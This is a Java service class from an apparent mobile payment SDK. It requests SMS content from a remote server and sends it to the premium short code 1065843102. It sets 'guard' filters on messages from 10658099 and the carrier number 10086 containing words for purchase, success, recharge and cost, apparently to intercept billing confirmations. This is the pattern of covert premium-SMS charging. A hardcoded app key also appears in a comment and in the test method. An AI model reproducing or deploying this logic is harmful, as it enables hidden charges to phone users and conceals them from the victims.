package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.log4j.Logger;
import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;

/**
 * http://www.52shenbi.com:13888/home/sms
 * app_id：10000006
	app_key：B2C953F584A87F37
 * @author leoliu
 *
 */
public class FfkjDm1DynamicService implements IDynamicService{
	
	private static Logger logger = Logger.getLogger(FfkjDm1DynamicService.class);

	private static final String TYPE = "ffkjDm1";
	private static final String DEST = "1065843102";
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String REQUESTMODEL = "app_id={app_id}&app_key={app_key}";
	
	private static final Guard guard1 = new Guard("10658099","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658099","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String app_key = map.get("app_key");
			String app_id = map.get("app_id");
			
			String pstr = REQUESTMODEL.replace("{app_id}",app_id).replace("{app_key}",app_key);
			
			logger.info("pstr:"+pstr);
			
			String responseJson = GetData.getData(url, pstr);
			
			xml = parseJson(responseJson);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parseJson(String responseJson){
		
		if(responseJson != null && responseJson.length() > 0){
			try{
				JSONObject jo = new JSONObject(responseJson);
				
				String status = jo.getString("status");
				
				if("success".equals(status)){
					String msg = jo.getString("data");
					
					List<Sms> smsList = new ArrayList<Sms>();
					
					Sms sms = new Sms();
					
					sms.setSmsContent(msg);
					sms.setSmsDest(DEST);
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					smsList.add(sms);
					
					Sms guardSms = new Sms();
					
					List<Guard> guardList = new ArrayList<Guard>();
					
					guardList.add(guard1);
					guardList.add(guard2);
					
					guardList.add(guard3);
					guardList.add(guard4);
					
					guardSms.setGuardList(guardList);
					
					smsList.add(0, guardSms);
						
					return XstreamHelper.toXml(smsList);
				}
			}catch(Exception e){
				e.printStackTrace();
			}
			
		}
		
		return null;
	}
	
	public static void main(String[] args){
		
		test2();
		
//		test3();
	}
	
	private static void test2(){
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", "http://www.52shenbi.com:13888/home/sms");
		map.put("app_id", "10000006");
		map.put("app_key", "B2C953F584A87F37");
		
		map.put("type", "ffkjDm1");
		map.put("channel", "10B201a123456788");
		
		System.out.println(new FfkjDm1DynamicService().dynamic(map));
	}
}
